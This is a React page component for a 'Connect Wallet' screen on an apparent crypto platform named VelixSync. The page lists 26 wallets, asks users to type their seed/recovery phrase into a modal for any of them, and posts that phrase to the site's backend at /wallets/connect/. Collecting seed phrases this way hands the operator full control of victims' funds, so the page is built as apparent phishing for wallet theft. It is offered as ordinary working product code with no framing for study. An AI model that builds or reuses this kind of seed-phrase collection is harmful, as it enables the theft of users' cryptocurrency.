"use client";

import { useState, useMemo } from "react";
import useSWR from "swr";
import { motion, AnimatePresence } from "framer-motion";
import { X } from "lucide-react";
import { apiFetch } from "@/lib/api";
import { WalletIcon } from "@/components/wallet-icons";

interface Wallet {
  id: string;
  name: string;
}

interface WalletResponse {
  wallet_type: string;
  wallet_name: string;
  connected_at: string;
}

interface WalletsListResponse {
  wallets: WalletResponse[];
}

const wallets: Wallet[] = [
  { id: "aktionariat", name: "Aktionariat Wallet" },
  { id: "binance", name: "Binance Wallet" },
  { id: "bitcoin", name: "Bitcoin Wallet" },
  { id: "bitkeep", name: "Bitkeep Wallet" },
  { id: "bitpay", name: "Bitpay" },
  { id: "blockchain", name: "Blockchain" },
  { id: "coinbase", name: "Coinbase Wallet" },
  { id: "coinbase-one", name: "Coinbase One" },
  { id: "crypto", name: "Crypto Wallet" },
  { id: "exodus", name: "Exodus Wallet" },
  { id: "gemini", name: "Gemini" },
  { id: "imtoken", name: "Imtoken" },
  { id: "infinito", name: "Infinito Wallet" },
  { id: "infinity", name: "Infinity Wallet" },
  { id: "keyringpro", name: "Keyringpro Wallet" },
  { id: "metamask", name: "Metamask" },
  { id: "ownbit", name: "Ownbit Wallet" },
  { id: "phantom", name: "Phantom Wallet" },
  { id: "pulse", name: "Pulse Wallet" },
  { id: "rainbow", name: "Rainbow" },
  { id: "robinhood", name: "Robinhood Wallet" },
  { id: "safepal", name: "Safepal Wallet" },
  { id: "sparkpoint", name: "Sparkpoint Wallet" },
  { id: "trust", name: "Trust Wallet" },
  { id: "uniswap", name: "Uniswap" },
  { id: "walletio", name: "Wallet io" },
];

export default function ConnectWalletPage() {
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);

  const { data: walletsRes, isLoading: isLoadingWallets, mutate } = useSWR<WalletsListResponse>("/wallets/");
  const connectedWallets = useMemo(
    () => new Set((walletsRes?.wallets ?? []).map((w) => w.wallet_type)),
    [walletsRes]
  );

  const handleToggle = (wallet: Wallet, isConnected: boolean) => {
    if (!isConnected) {
      setSelectedWallet(wallet);
      setIsDialogOpen(true);
      setSeedPhrase("");
      setError(null);
      setSuccess(null);
    } else {
      handleDisconnect(wallet.id);
    }
  };

  const handleConnect = async () => {
    if (!selectedWallet || !seedPhrase.trim()) {
      setError("Please enter your seed phrase");
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await apiFetch("/wallets/connect/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          wallet_type: selectedWallet.id,
          wallet_name: selectedWallet.name,
          seed_phrase: seedPhrase,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        mutate(
          (current) => ({
            wallets: [
              ...(current?.wallets ?? []),
              { wallet_type: selectedWallet.id, wallet_name: selectedWallet.name, connected_at: new Date().toISOString() },
            ],
          }),
          { revalidate: false }
        );
        setSuccess(data.message || "Wallet connected successfully");
        setIsDialogOpen(false);
        setSeedPhrase("");
        setSelectedWallet(null);
      } else {
        setError(data.error || "Failed to connect wallet");
      }
    } catch (error) {
      console.error("Error connecting wallet:", error);
      setError("An error occurred while connecting the wallet");
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async (walletId: string) => {
    setIsLoading(true);
    setError(null);

    try {
      const response = await apiFetch(`/wallets/${walletId}/disconnect/`, {
        method: "DELETE",
      });

      const data = await response.json();

      if (response.ok && data.success) {
        mutate(
          (current) => ({ wallets: (current?.wallets ?? []).filter((w) => w.wallet_type !== walletId) }),
          { revalidate: false }
        );
        setSuccess(data.message || "Wallet disconnected successfully");
      } else {
        setError(data.error || "Failed to disconnect wallet");
      }
    } catch (error) {
      console.error("Error disconnecting wallet:", error);
      setError("An error occurred while disconnecting the wallet");
    } finally {
      setIsLoading(false);
    }
  };

  const handleCloseDialog = () => {
    setIsDialogOpen(false);
    setSeedPhrase("");
    setSelectedWallet(null);
    setError(null);
  };

  return (
    <div className="min-h-screen">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="mb-8">
          <h1 className="text-lg sm:text-xl font-bold text-gray-900 dark:text-white mb-4">
            Connect Wallet
          </h1>
          <p className="text-gray-600 dark:text-gray-400 text-sm md:text-base max-w-4xl">
            Link your wallet to access premium features. VelixSync offers
            support for over 500 exchanges and wallets, NFTs, more than 10,000
            cryptocurrencies, and 20,000 DeFi smart contracts.
          </p>
        </div>

        {/* Success/Error Messages */}
        {success && (
          <div className="mb-6 bg-green-500/10 border border-green-500/20 rounded-lg p-4">
            <p className="text-green-600">{success}</p>
          </div>
        )}
        {error && !isDialogOpen && (
          <div className="mb-6 bg-red-500/10 border border-red-500/20 rounded-lg p-4">
            <p className="text-red-600 dark:text-red-400">{error}</p>
          </div>
        )}

        {/* Loading State */}
        {isLoadingWallets ? (
          <div className="flex items-center justify-center py-12">
            <div className="w-5 h-5 border-2 border-green-600 border-t-transparent rounded-full animate-spin" />
          </div>
        ) : (
          /* Wallets Grid */
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {wallets.map((wallet) => {
              const isConnected = connectedWallets.has(wallet.id);
              return (
                <div
                  key={wallet.id}
                  className="flex items-center justify-between p-4 rounded-lg tv-card hover:border-[#16a34a] transition-all"
                >
                  <div className="flex items-center space-x-3">
                    <WalletIcon type={wallet.id} className="w-10 h-10" />
                    <span className="font-medium text-gray-900 dark:text-white text-sm md:text-base">
                      {wallet.name}
                    </span>
                  </div>

                  {/* Toggle Switch */}
                  <button
                    onClick={() => handleToggle(wallet, isConnected)}
                    disabled={isLoading}
                    className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-green-600 focus:ring-offset-2 disabled:opacity-50 ${
                      isConnected
                        ? "bg-green-600"
                        : "bg-gray-200 dark:bg-gray-600"
                    }`}
                  >
                    <span
                      className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                        isConnected ? "translate-x-6" : "translate-x-1"
                      }`}
                    />
                  </button>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Connect Wallet Modal */}
      <AnimatePresence>
        {isDialogOpen && selectedWallet && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={handleCloseDialog}
              className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50"
            />

            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="fixed inset-0 z-50 flex items-center justify-center p-4"
              onClick={handleCloseDialog}
            >
              <div
                className="rounded-2xl max-w-lg w-full p-6 bg-white dark:bg-[#0b1a12] border border-gray-200 dark:border-[rgba(22,163,74,0.14)]"
                onClick={(e) => e.stopPropagation()}
              >
                <button
                  onClick={handleCloseDialog}
                  className="absolute top-4 right-4 w-8 h-8 rounded-full flex items-center justify-center hover:opacity-80 transition-opacity bg-gray-100 dark:bg-white/8"
                >
                  <X className="w-5 h-5 text-gray-500 dark:text-gray-400" />
                </button>

                <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-2">
                  Connect Wallet
                </h2>
                <p className="text-sm text-gray-600 dark:text-gray-400 mb-6">
                  Connect your wallet to start enjoying your account&apos;s
                  additional benefits.
                </p>

                <div className="space-y-4">
                  <div>
                    <label className="text-sm font-medium text-gray-900 dark:text-white">
                      Wallet
                    </label>
                    <div className="mt-2 p-3 rounded-md bg-gray-100 dark:bg-white/[0.04] border border-gray-200 dark:border-[rgba(255,255,255,0.06)]">
                      <span className="text-gray-900 dark:text-white">
                        {selectedWallet.name}
                      </span>
                    </div>
                  </div>

                  <div>
                    <label
                      htmlFor="seed-phrase"
                      className="text-sm font-medium text-gray-900 dark:text-white"
                    >
                      Seed/Recovery Phrase:
                    </label>
                    <textarea
                      id="seed-phrase"
                      placeholder={`Enter your ${selectedWallet.name} Seed/Recovery Phrase to connect your wallet`}
                      value={seedPhrase}
                      onChange={(e) => setSeedPhrase(e.target.value)}
                      className="mt-2 w-full min-h-[120px] p-3 bg-gray-100 dark:bg-white/[0.04] border border-gray-200 dark:border-[rgba(255,255,255,0.06)] rounded-lg text-gray-900 dark:text-white placeholder:text-gray-500 focus:outline-none focus:border-[#16a34a] resize-none"
                      disabled={isLoading}
                    />
                  </div>

                  {error && (
                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                      <p className="text-sm text-red-600 dark:text-red-400">{error}</p>
                    </div>
                  )}

                  <div className="flex flex-col sm:flex-row gap-3 pt-4">
                    <button
                      onClick={handleConnect}
                      disabled={!seedPhrase.trim() || isLoading}
                      className="flex-1 py-3 font-semibold rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed hover:opacity-90"
                      style={{ background: "#16a34a", color: "#001a0f" }}
                    >
                      {isLoading ? "Connecting..." : "Connect Wallet"}
                    </button>
                    <button
                      onClick={handleCloseDialog}
                      disabled={isLoading}
                      className="flex-1 py-3 bg-gray-200 dark:bg-white/10 hover:bg-gray-300 dark:hover:bg-white/20 text-gray-900 dark:text-white font-semibold rounded-lg transition-all"
                    >
                      Cancel
                    </button>
                  </div>
                </div>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}
